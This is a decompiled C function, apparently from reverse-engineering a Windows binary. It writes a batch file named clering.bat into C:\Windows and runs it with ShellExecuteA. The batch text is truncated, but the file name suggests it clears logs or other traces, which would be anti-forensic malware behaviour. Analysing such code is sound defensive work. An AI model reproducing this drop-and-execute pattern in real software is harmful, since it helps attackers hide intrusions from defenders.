
void FUN_00401e3f(void)

{
  DWORD local_c;
  HANDLE local_8;
  
  local_8 = CreateFileA(s_c:\Windows\clering.bat_00404300,0xc0000000,0,(LPSECURITY_ATTRIBUTES)0x0,4,
                        0,(HANDLE)0x0);
  WriteFile(local_8,s_@echo_off_for_/F_"tokens=*"_%%G_i_00404324,0xb2,&local_c,(LPOVERLAPPED)0x0);
  CloseHandle(local_8);
  ShellExecuteA((HWND)0x0,&DAT_0040431f,s_c:\Windows\clering.bat_00404300,(LPCSTR)0x0,(LPCSTR)0x0,0)
  ;
  return;
}
